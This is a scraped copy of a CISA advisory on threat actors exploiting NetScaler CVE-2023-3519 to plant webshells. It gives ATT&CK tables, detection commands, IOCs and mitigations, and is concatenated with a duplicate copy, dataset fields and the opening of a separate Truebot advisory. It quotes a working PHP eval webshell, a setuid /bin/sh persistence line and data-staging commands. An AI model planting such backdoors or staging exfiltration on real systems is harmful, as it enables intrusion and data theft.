As part of their initial exploit chain, the threat actors uploaded a TGZ file contain a setuid binary on the ADC appliance.



 

Table 6: Cyber Threat Actors ATT&CK Techniques for Defense Evasion


Technique Title
ID
Use




Deobfuscate/Decode Files or Information
T1140
The threat actors deployed the SECRETSAUCE webshell, which can receive PHP code from an HTTP POST request, decrypt it using an internally embedded RSA public key.


File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
T1222.002
The threat actors appended /flash/nsconfig/rc.netscaler with:chmod u+s /bin/shecho “<?php http_response_code(401);@eval(\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php.


Indicator Removal
T1070
The threat actors deleted log files from Victim 2.


Indicator Removal: Clear Linux or Mac System Logs
T1070.002
The threat actors some access logs, error logs, and authentication logs from Victim 2.


Indicator Removal: File Deletion
T1070.004
The threat actors deleted collected files after exfiltrating them.


Masquerading
T1036
The actor has used the following file names for SECRETSAUCE to appear legitimate: vpn[.]php, logout[.]php, log[.]php, and prod[.]php.


Masquerading: Match Legitimate Name or Location
T1036.005
The threat actors named a webshell *logouttm.php*.


Masquerading: Masquerade File Type
T1036.008
The threat actors exfiltrated data by uploading it as an image file to a web-accessible path.



 

Table 7: Cyber Threat Actors ATT&CK Techniques for Credential Access


Technique Title
ID
Use




Unsecured Credentials: Credentials In Files
T1552.001
The threat actors obtained encrypted passwords from NetScaler ADC configuration files, and the decryption key was stored on the ADC appliance.


Unsecured Credentials: Private Keys
T1552.004
The threat actors obtained decryption keys to decrypt the AD credential obtained from the NetScaler ADC configuration files.



 

Table 8: Cyber Threat Actors ATT&CK Techniques for Discovery


Technique Title
ID
Use




Domain Trust Discovery
T1482
The threat actors queried the AD for trusts.


Permission Groups Discovery: Domain Groups
T1069.002
The threat actors quired the AD for groups.


Remote System Discovery
T1018

The threat actors queried the AD for computers.
The threat actors attempted to execute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets. Network-segmentation controls prevented this activity.



System Network Configuration Discovery
T1016
The actors used a webshell for AD enumeration.


System Network Configuration Discovery: Internet Connection Discovery
T1016.001
The threat actors attempted to verify outbound network connectivity with a ping command and executed host commands for a subnet-wide DNS lookup. Network-segmentation controls prevented this activity.


Network Service Discovery
T1046
The threat actors conducted SMB scanning on the organization’s subnet.


Account Discovery: Domain Account
T1087.002
The threat actors queried the AD for users.



 

Table 9: Cyber Threat Actors ATT&CK Techniques for Collection


Technique Title
ID
Use




Archive Collected Data: Archive via Utility
T1560.001

The threat actors encrypted discovery data collected via openssl in “tar ball.”
Update September 6, 2023:
The threat actors collected data in gzipped text files.
End update



Data from Local System
T1005
The threat actors viewed NetScaler ADC configuration files flash/nsconfig/keys/updated/* and /nsconfig/ns.conf.


Data Staged
T1074
The threat actors uploaded data as an image file to a web-accessible path: cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png.


Data Staged: Local Data Staging
T1074.001
The threat actors modified tool wrote captured credentials to a file created in a hard-coded path (/var/nslog/counters/ prometheus/metrc_codes_client.log).



 

Table 10: Cyber Threat Actors ATT&CK Techniques for Command and Control


Technique Title
ID
Use




Encrypted Channel: Asymmetric Cryptography
T1573.002
The threat actors deployed LIGOLO-NG, which is a tunneller that provides encrypted reverse TCP/TLS connections to a remote host.


Ingress Tool Transfer
T1105
The threat actors exploited CVE-2023-3519 to upload a TGZ file containing a generic webshell, discovery script, and setuid binary on the ADC appliance.


Protocol Tunneling
T1572
The threat actors deployed LIGOLO-NG and NPS tunnellers.


Proxy: Internal Proxy
T1090.001
The actors likely used a PHP shell with proxying capability to attempt proxying SMB traffic to the DC (the traffic was blocked by a firewall and account restrictions).


Proxy: Multi-hop Proxy
T1090.003
The threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.



 

Table 11: Cyber Threat Actors ATT&CK Techniques for Impact


Technique Title
ID
Use




Account Access Removal
T1531
The threat actors deleted the authorization configuration file (/etc/auth.conf)—likely to prevent configured users from logging in remotely (e.g., CLI).



 
DETECTION METHODS
Run the following victim-created checks on the ADC shell interface to check for signs of compromise:

Check for files newer than the last installation.
Modify the -newermt parameter with the date that corresponds to your last installation:

find /netscaler/ns_gui/ -type f -name *.php -newermt [YYYYMMDD] -exec ls -l {} \;
find /var/vpn/ -type f -newermt [YYYYMMDD] -exec ls -l {} \;
find /var/netscaler/logon/ -type f -newermt [YYYYMMDD] -exec ls -l {} \;
find /var/python/ -type f -newermt [YYYYMMDD] -exec ls -l {} \;


Check http error logs for abnormalities that may be from initial exploit:

zgrep '\.sh' /var/log/httperror.log*
zgrep '\.php' /var/log/httperror.log*


Check shell logs for unusual post-ex commands, for example:

grep '/flash/nsconfig/keys' /var/log/sh.log*


Look for setuid binaries dropped:

find /var -perm -4000 -user root -not -path ""/var/nslog/*"" -newermt [YYYYMMDD] -exec ls -l {} \;


Review network and firewall logs for subnet-wide scanning of HTTP/HTTPS/SMB (80/443/445) originating from the ADC.
Review DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post-AD enumeration of computer objects).
Review network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).
Review number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).
Pay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.
Review AD logs for logon activities originating from the ADC IP with the account configured for AD connection. 
If logon restriction is configured for the AD account, check event 4625 where the failure reason is “User not allowed to logon at this computer.”
Review NetScaler ADC internal logs (sh.log*, bash.log*) for traces of potential malicious activity (some example keywords for grep are provided below): 

database.php
ns_gui/vpn
/flash/nsconfig/keys/updated 
LDAPTLS_REQCERT 
ldapsearch 
openssl + salt


Review NetScaler ADC internal access logs (httpaccess-vpn.log*) for 200 successful access of unknown web resources.

Update September 6, 2023:
The following resources may assist with detecting signs of compromise:

Mandiant: Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)
GreyNoise: Will the real Citrix CVE-2023-3519 please stand up?
Shadowserver: Technical Summary of Observed Citrix CVE-2023-3519 Incidents
Mandiant: Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)
(Update October 6, 2023) IBM: X-Force uncovers global NetScaler Gateway credential harvesting campaign

End Update
 
Update September 6, 2023:
INDICATORS OF COMPROMISE
See Table 12 for IOCs obtained from Victim 2. (Note: a trusted third party observed the same PHP webshell and ELF binary hashes).

Table 12: Victim 2-provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation


File Name
Description
SHA-1 Hash
MD5 Hash




Logouttm[.]php
PHP Webshell
3345ad8b43d6771532ca55acf7e95fe98aeadb27
47b8d29319a9e85aaf829f4f2f9c6c00


pykeygen
ELF Binary
b8f9258e9c7c882944e2b773557b49e5821517fe
ee51f599d266be5fd89b423ca24521f1



 
See Table 13 and Table 14 for IOCs addresses obtained from trusted third parties.

Table 13: Third-party Provided IP Addresses Affiliated with Citrix CVE-2023-3519 Exploitation


IP Address
Description
Date Observed




5.2.64[.]155
Threat actors used this to drop a webshell.
June 12, 2023


5.255.101[.]76
Attempted outbound connection to this C2 observed on a victim.
Late June 2023


172.94.124[.]18
Threat actors used this infrastructure to remote into a victim network.
July 20, 2023


154.6.91[.]149
Threat actors used this infrastructure to remote into a victim network.
July 21, 2023



 

Table 14: Third-party Provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation


File Name
Description
SHA-1 Hash
MD5 Hash




info[.]php
PHP Webshell
55c83cb25be5c521e4874e22b1422c360abf0a29
c0b32901f9c6ce3f965b8552f7d058d4


NPS
NPS tunneller [4]
ec17f7b3acb2334a062c37e0271c31c3c8b6879c
9b6f12aed2369a99a1132edd2ede779d


the
LIGOLO-NG [3] tunneller
dec36a2aa4ecb86eafd01015e27c06f51d104317
b383c4ed6712a0a06fb85b1d8405e0f1



End Update
 
INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).

Update September 6, 2023:
If the threat actor used /flash/nsconfig/rc.netscaler to make /bin/sh a setuid binary and to rewrite a webshell on every reboot, organizations should clean rc.netscaler to prevent the webshell from getting rewritten by using the following third-party created command.




root@SOME-NETSCALER# cat /flash/nsconfig/rc.netscaler
[redacted output]
chmod u+s /bin/sh
echo ""<?php http_response_code(401);@eval(\$_REQUEST['variable']);?>"" > /[redacted webshell path]/[redacted].php
 
root@SOME-NETSCALER# cat /[redacted webshell path]/[redacted].php
<?php http_response_code(401);@eval($_REQUEST['variable']);?>




 
MITIGATIONS
CISA recommends all organizations:

Install the relevant updated version of NetScaler ADC and NetScaler Gateway as soon as possible. See Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467 for patch information.
Follow best cybersecurity practices in your production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and for all services. For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).
As a longer-term effort, apply robust network-segmentation controls on NetScaler appliances, and other internet-facing devices.

 
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1–Table 11).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
 
REFERENCES
[1] Citrix Security Bulletin CTX561482: Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467
Update September 6, 2023:
[2] GitHub - dxkite/php-stream-shell: a simple stream_wrapper shell
[3] GitHub - ssh-inject/injectme.c
[4] GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg
[5] GitHub - nicocha30/ligolo-ng
[6] GitHub - ehang-io/nps
[7] Microsoft: AD Explorer - Sysinternals
End Update
 
Update September 6, 2023:
ACKNOWLEDGEMENTS
Mandiant and Shadowserver contributed to this Cybersecurity Advisory.
End Update
 
VERSION HISTORY
July 20, 2023: Initial version.July 24, 2023: Updated affected NetScaler ADC 12.1-FIPS and NetScaler ADC 12.1-NDcPP version numbers. Updated Step 3 in Detection Methods to use zgrep instead of grep.September 6, 2023: Updates noted throughout.September 21, 2023: Removed persistence commands and associated technique for tampering with security tools.October 6, 2023: Updated resources in Detection Methods section






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1573.002', 'T1531', 'T1505.003', 'T1588.002', 'TA0010', 'T1005', 'T1059.004', 'T1222.002', 'TA0005', 'T1482', 'T1016', 'T1190', 'T1560.001', 'T1069.002', 'T1548.001', 'T1074.001', 'T1036.005', 'T1105', 'T1018', 'T1572', 'T1087.002', 'T1140', 'T1090.001', 'T1547', 'T1584', 'T1070.004', 'T1552.004', 'T1552.001', 'T1070', 'T1046', 'TA0007', 'T1033', 'T1074', 'T1016.001', 'T1070.002', 'T1106', 'T1036.008', 'T1036', 'T1090.003'}","



SUMMARY
Update September 6, 2023:
This Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.
Update End
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero-day to drop a webshell on a critical infrastructure organization’s non-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim’s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network-segmentation controls for the appliance blocked movement.
The victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023.
This advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.
Download the PDF version of this report:


AA23-201A Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells
(PDF,       560.29 KB
  )


Update September 6, 2023:
In August 2023, CISA received TTPs and IOCs from an additional victim and trusted third parties. This CSA has been updated with the TTPs and IOCs to assist administrators with detecting and responding to this activity.
For a downloadable list of IOCs, see the following XML and JSON files:


AA23-201A STIX XML
(XML,       43.13 KB
  )




AA23-201A STIX JSON
(JSON,       40.09 KB
  )


Update End
 
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
In July 2023, a critical infrastructure organization reported to CISA that threat actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519. Citrix released a patch on July 18, 2023.,1,
Update September 6, 2023:
In August 2023, CISA received TTPs and IOCs from an additional victim and third parties. The actors implanted a webshell, gained root level access to the compromised system, and performed discovery against the Active Directory (AD). For information, see the Victim 2 and Additional Observed Activity sections.
Update End
CVE-2023-3519
CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:,1,

NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.13
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-91.13
NetScaler ADC and NetScaler Gateway version 12.1, now end of life
NetScaler ADC 13.1-FIPS before 13.1-37.159
NetScaler ADC 12.1-FIPS before 12.1-55.297
NetScaler ADC 12.1-NDcPP before 12.1-55.297

The affected appliance must be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or authentication, authorization, and auditing (AAA) virtual server for exploitation.,1,
CISA added CVE-2023-3519 to its Known Exploited Vulnerabilities Catalog on July 19, 2023.
Threat Actor Activity
Victim 1
As part of their initial exploit chain, the threat actors uploaded a TGZ file, containing a generic webshell, discovery script, and setuid binary, on the ADC appliance and conducted SMB scanning on the subnet,.
The actors used the webshell for AD enumeration, and to exfiltrate AD data,. Specifically, the actors:

Viewed NetScaler configuration files /flash/nsconfig/keys/updated/* and /nsconfig/ns.conf,. Note: These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance,.
Viewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file),.
Used the decrypted AD credential to query the AD via ldapsearch. The actors queried for:

Users (objectClass=user) (objectcategory=person),
Computers (objectClass=computer),
Groups (objectClass=group),
Subnets (objectClass=subnet)
Organizational Units (objectClass=organizationalUnit)
Contacts (objectClass=contact)
Partitions (objectClass=partition)
Trusts (objectClass=trustedDomain),


Used the following command to encrypt discovery data collected via openssl in “tar ball”,: tar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz. (A “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration.)
Exfiltrated collected data by uploading as an image file, to a web-accessible path,: cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png.

The actors’ other discovery activities were unsuccessful due to the critical infrastructure organization’s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:

Execute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.
Verified outbound network connectivity with a ping command (ping -c 1 google.com),.
Executed host commands for a subnet-wide DNS lookup.

The actors also attempted to delete their artifacts,. The actors deleted the authorization configuration file (/etc/auth.conf)—likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI),. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it.
The actors’ post-exploitation lateral movement attempts were also blocked by network-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC, (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.
Update September 6, 2023:
Victim 2
Threat actors uploaded a PHP webshell *logouttm.php*, likely as part of their initial exploit chain, to */netscaler/ns_gui/vpn/. Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary pykeygen that set user unique identifier (UID) to root and executed /bin/sh, via setuid and execve syscall.*,. Note: A third party also observed threat actors use an ELF binary (named pip4) to execute /bin/sh via syscall and change the UID to root. pip4 was located at /var/python/bin.
With root level access, the actors used hands-on-keyboard for discovery. They queried the AD via ldapsearch for users, groups, and computers. They collected the data in gzipped text files renamed 1.css and 2.css and placed the files in /netscaler/ns_gui/vpn/ for exfiltration.
After exfiltrating the files, the actors deleted them from the system, as well as some access logs, error logs, and authentication logs,. The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity.
For command and control (C2), the actors appeared to use compromised pfSense devices,; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi-hop proxying C2 traffic,.
Additional Observed Activity
According to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools,:

Loaded loading,.,php to /vpn/vpn/. Loading,.,php is a modified version of an open-source PHP webshell,2,. The modified webshell had a custom protocol handler, update://, created via a stream_wrapper_register (https://www.php.net/manual/en/function.stream-wrapper-register,.,php). The custom protocol enabled the webshell to send encoded commands to the AD via ldapsearch:



Loaded a modified version of open-source SSH inject tool,3, named libnsd.so to the /tmp directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters + reversed/base64) to a file created in a hard-coded path (/var/nslog/counters/prometheus/metrc_codes_client.log),. The actors then exfiltrated the collected credentials and deleted /var/nslog/counters/prometheus/metrc_codes_client.log 3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors’ memory hook was still active.)
Deployed webshells to victim networks at \vpn\themes.

One third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an HTTP POST request, decrypt it using an internally embedded RSA public key, and execute the code in memory; each request to the webshell returns an HTTP 500 response code. The actor has used the following file names for SECRETSAUCE: vpn,.,php, logout,.,php, log,.,php, prod,.,php,.
A second third party observed the actors deploy an open source webshell,4, with filename defaults.php.


Deployed LIGOLO-NG,5, tunneller with the filename the in the /tmp directory. LIGOLO-NG is a tunneller, written in Go that provides encrypted reverse TCP/TLS connections, to a remote host.
Deployed the NPS tunneller,6, to victim networks to the /tmp directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse.

Additionally, threat actors:

Appended /flash/nsconfig/rc.netscaler with:chmod u+s /bin/shecho “<?php http_response_code(401);@eval(\$_REQUEST,‘variable’,);?>” > /,redacted path to webshell,/,redacted,.php,.

The webshell path was in a web accessible folder, and the actors’ modifications enabled them to run /bin/sh commands as root and enabled persistence because the webshell was run on every reboot,.

Used Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD,7,. The actors dropped the tool to C:\Users\<redacted>\AppData\Local\Temp\ADExplorer.exe and executed it with the following command: ADExplorer.exe -snapshot """" <filename>.dat /accepteula.

Update End
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1–Table 11 for all referenced threat actor tactics and techniques in this advisory.
Update September 6, 2023
The tables have been updated with the following techniques:

Compromise Infrastructure,
Obtain Capabilities: Tool,
Command and Scripting Interpreter: Unix Shell,
Native API,
Boot or Logon Autostart Execution,
Proxy: Multi-hop Proxy,
Deobfuscate/Decode Files or Information,
File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,
Indicator Removal,
Indicator Removal: Clear Linux or Mac System Logs,
Indicator Removal: File Deletion,
Masquerading,
Masquerading: Match Legitimate Name or Location,
Data Staged: Local Data Staging,
Protocol Tunneling,

End Update

 

 

 

 

 

 

 

 

 

 

 
DETECTION METHODS
Run the following victim-created checks on the ADC shell interface to check for signs of compromise:

Check for files newer than the last installation.
Modify the -newermt parameter with the date that corresponds to your last installation:

find /netscaler/ns_gui/ -type f -name *.php -newermt,YYYYMMDD, -exec ls -l {} \;
find /var/vpn/ -type f -newermt,YYYYMMDD, -exec ls -l {} \;
find /var/netscaler/logon/ -type f -newermt,YYYYMMDD, -exec ls -l {} \;
find /var/python/ -type f -newermt,YYYYMMDD, -exec ls -l {} \;


Check http error logs for abnormalities that may be from initial exploit:

zgrep '\.sh' /var/log/httperror.log*
zgrep '\.php' /var/log/httperror.log*


Check shell logs for unusual post-ex commands, for example:

grep '/flash/nsconfig/keys' /var/log/sh.log*


Look for setuid binaries dropped:

find /var -perm -4000 -user root -not -path ""/var/nslog/*"" -newermt,YYYYMMDD, -exec ls -l {} \;


Review network and firewall logs for subnet-wide scanning of HTTP/HTTPS/SMB (80/443/445) originating from the ADC.
Review DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post-AD enumeration of computer objects).
Review network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).
Review number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).
Pay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.
Review AD logs for logon activities originating from the ADC IP with the account configured for AD connection. 
If logon restriction is configured for the AD account, check event 4625 where the failure reason is “User not allowed to logon at this computer.”
Review NetScaler ADC internal logs (sh.log*, bash.log*) for traces of potential malicious activity (some example keywords for grep are provided below): 

database.php
ns_gui/vpn
/flash/nsconfig/keys/updated 
LDAPTLS_REQCERT 
ldapsearch 
openssl + salt


Review NetScaler ADC internal access logs (httpaccess-vpn.log*) for 200 successful access of unknown web resources.

Update September 6, 2023:
The following resources may assist with detecting signs of compromise:

Mandiant: Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)
GreyNoise: Will the real Citrix CVE-2023-3519 please stand up?
Shadowserver: Technical Summary of Observed Citrix CVE-2023-3519 Incidents
Mandiant: Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)
(Update October 6, 2023) IBM: X-Force uncovers global NetScaler Gateway credential harvesting campaign

End Update
 
Update September 6, 2023:
INDICATORS OF COMPROMISE
See Table 12 for IOCs obtained from Victim 2. (Note: a trusted third party observed the same PHP webshell and ELF binary hashes).

 
See Table 13 and Table 14 for IOCs addresses obtained from trusted third parties.

 

End Update
 
INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).

Update September 6, 2023:
If the threat actor used /flash/nsconfig/rc.netscaler to make /bin/sh a setuid binary and to rewrite a webshell on every reboot, organizations should clean rc.netscaler to prevent the webshell from getting rewritten by using the following third-party created command.

 
MITIGATIONS
CISA recommends all organizations:

Install the relevant updated version of NetScaler ADC and NetScaler Gateway as soon as possible. See Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467 for patch information.
Follow best cybersecurity practices in your production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and for all services. For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).
As a longer-term effort, apply robust network-segmentation controls on NetScaler appliances, and other internet-facing devices.

 
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1–Table 11).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
 
REFERENCES,1, Citrix Security Bulletin CTX561482: Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467
Update September 6, 2023:,2, GitHub - dxkite/php-stream-shell: a simple stream_wrapper shell,3, GitHub - ssh-inject/injectme.c,4, GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg,5, GitHub - nicocha30/ligolo-ng,6, GitHub - ehang-io/nps,7, Microsoft: AD Explorer - Sysinternals
End Update
 
Update September 6, 2023:
ACKNOWLEDGEMENTS
Mandiant and Shadowserver contributed to this Cybersecurity Advisory.
End Update
 
VERSION HISTORY
July 20, 2023: Initial version.July 24, 2023: Updated affected NetScaler ADC 12.1-FIPS and NetScaler ADC 12.1-NDcPP version numbers. Updated Step 3 in Detection Methods to use zgrep instead of grep.September 6, 2023: Updates noted throughout.September 21, 2023: Removed persistence commands and associated technique for tampering with security tools.October 6, 2023: Updated resources in Detection Methods section






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-201a
23,"



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Canadian Centre for Cyber Security (CCCS) are releasing this joint Cybersecurity Advisory (CSA) in response to cyber threat actors leveraging newly identified Truebot malware variants against organizations in the United States and Canada. As recently as May 31, 2023, the authoring organizations have observed an increase in cyber threat actors using new malware variants of Truebot (also known as Silence.Downloader). Truebot is a botnet that has been used by malicious cyber groups like CL0P Ransomware Gang to collect and exfiltrate information from its target victims.
Previous Truebot malware variants were primarily delivered by cyber threat actors via malicious phishing email attachments; however, newer versions allow cyber threat actors to also gain initial access through exploiting CVE-2022-31199—(a remote code execution vulnerability in the Netwrix Auditor application), enabling deployment of the malware at scale within the compromised environment. Based on confirmation from open-source reporting and analytical findings of Truebot variants, the authoring organizations assess cyber threat actors are leveraging both phishing campaigns with malicious redirect hyperlinks and CVE-2022-31199 to deliver new Truebot malware variants.
The authoring organizations recommend hunting for the malicious activity using the guidance outlined in this CSA, as well as applying vendor patches to Netwrix Auditor (version 10.5—see Mitigations section below).[1] Any organization identifying indicators of compromise (IOCs) within their environment should urgently apply the incident responses and mitigation measures detailed in this CSA and report the intrusion to CISA or the FBI.
Download the PDF version of this report:


AA23-187A Increased Truebot Activity Infects U.S. and Canada Based Networks
(PDF,       891.26 KB
  )


Read the associated Malware Analysis Report MAR-10445155-1.v1 Truebot Activity Infects U.S. and Canada Based Networks or download the PDF version below:


MAR-10445155-1.v1 Truebot Activity Infects U.S. and Canada Based Networks
(PDF,       315.39 KB
  )


For a downloadable copy of IOCs in .xml and .json format, see:


AA23-187A STIX XML
(XML,       204.54 KB
  )




AA23-187A STIX JSON
(JSON,       140.24 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section below for cyber threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access and Execution
In recent months, open source reporting has detailed an increase in Truebot malware infections, particularly cyber threat actors using new tactics, techniques, and procedures (TTPs), and delivery methods.[2] Based on the nature of observed Truebot operations, the primary objective of a Truebot infection is to exfiltrate sensitive data from the compromised host(s) for financial gain [TA0010].

Phishing:

Cyber threat actors have historically used malicious phishing emails as the primary delivery method of Truebot malware, which tricks recipients into clicking a hyperlink to execute malware. Cyber threat actors have further been observed concealing email attachments (executables) as software update notifications [T1189] that appear to be legitimate [T1204.002], [T1566.002]. Following interaction with the executable, users will be redirected to a malicious web domain where script files are then executed. Note: Truebot malware can be hidden within various, legitimate file formats that are used for malicious purposes [T1036.008].[3]


Exploitation of CVE-2022-31199:

Though phishing remains a prominent delivery method, cyber threat actors have shifted tactics, exploiting, in observable manner, a remote code execution vulnerability (CVE-2022-31199) in Netwrix Auditor [T1190]—software used for on-premises and cloud-based IT system auditing. Through exploitation of this CVE, cyber threat actors gain initial access, as well as the ability to move laterally within the compromised network [T1210].




 

Figure 1: CVE-2022-31199 Delivery Method for Truebot

Following the successful download of the malicous file, Truebot renames itself and then loads FlawedGrace onto the host. Please see the FlawedGrace section below for more information on how this remote access tool (RAT) is used in Truebot operations.
